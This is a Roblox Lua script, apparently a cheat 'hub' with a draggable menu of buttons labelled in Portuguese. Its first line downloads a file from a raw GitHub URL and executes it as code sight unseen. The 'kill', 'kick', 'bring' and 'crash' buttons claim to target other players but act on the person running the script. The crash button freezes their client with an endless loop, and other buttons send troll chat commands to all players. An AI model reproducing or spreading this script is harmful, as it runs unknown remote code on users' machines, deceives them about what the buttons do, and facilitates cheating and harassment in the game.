loadstring(game:HttpGet("https://raw.githubusercontent.com/Benjamim-b/Ksksks.txt/refs/heads/main/README.md"))()

local Players = game:GetService("Players")
local player = Players.LocalPlayer

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Benjamim Hub"
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0,300,0,500)
frame.Position = UDim2.new(0.05,0,0.2,0)
frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
frame.BorderSizePixel = 0
frame.Parent = screenGui
frame.Active = true
frame.Draggable = true

local function createButton(text,posY,callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0,260,0,40)
    btn.Position = UDim2.new(0,20,0,posY)
    btn.Text = text
    btn.TextSize = 18
    btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.Parent = frame
    btn.MouseButton1Click:Connect(callback)
end

local targetNameVal = Instance.new("StringValue")
targetNameVal.Name = "TargetName"
targetNameVal.Value = ""
targetNameVal.Parent = player

local messageVal = Instance.new("StringValue")
messageVal.Name = "MessageToSend"
messageVal.Value = ""
messageVal.Parent = player

local function sendChatCommand(cmd)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cmd,"All")
end

local function doKill() if player.Character and player.Character:FindFirstChild("Humanoid") then player.Character.Humanoid.Health = 0 end end
local function doKick() player:Kick("Você se expulsou via KitK4t Hub") end
local function doBring() if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0,10,0)) end end
local function doCrash() while true do task.spawn(function() end) end end
local function doVerifique() sendChatCommand(";verifique") end
local function doChatTroll() sendChatCommand(";chatTroll "..targetNameVal.Value.." "..messageVal.Value) end

createButton("matar o playet",20,doKill)
createButton("Explusar o jogador do game",70,doKick)
createButton("Bring Pra o player sair voando",120,doBring)
createButton("Crash Player",170,doCrash)
createButton("Verificar se tem pessoa usando o hub",220,doVerifique)
createButton("ChatTroll",270,doChatTroll)

local targetBox = Instance.new("TextBox")
targetBox.Size = UDim2.new(0,260,0,40)
targetBox.Position = UDim2.new(0,20,0,320)
targetBox.PlaceholderText = "Nome do jogador (para chatPlayer)"
targetBox.TextSize = 18
targetBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
targetBox.TextColor3 = Color3.fromRGB(255,255,255)
targetBox.ClearTextOnFocus = false
targetBox.Parent = frame
targetBox:GetPropertyChangedSignal("Text"):Connect(function() targetNameVal.Value = targetBox.Text end)

local messageBox = Instance.new("TextBox")
messageBox.Size = UDim2.new(0,260,0,40)
messageBox.Position = UDim2.new(0,20,0,370)
messageBox.PlaceholderText = "Mensagem do chatPlayet"
messageBox.TextSize = 18
messageBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
messageBox.TextColor3 = Color3.fromRGB(255,255,255)
messageBox.ClearTextOnFocus = false
messageBox.Parent = frame
messageBox:GetPropertyChangedSignal("Text"):Connect(function() messageVal.Value = messageBox.Text end)
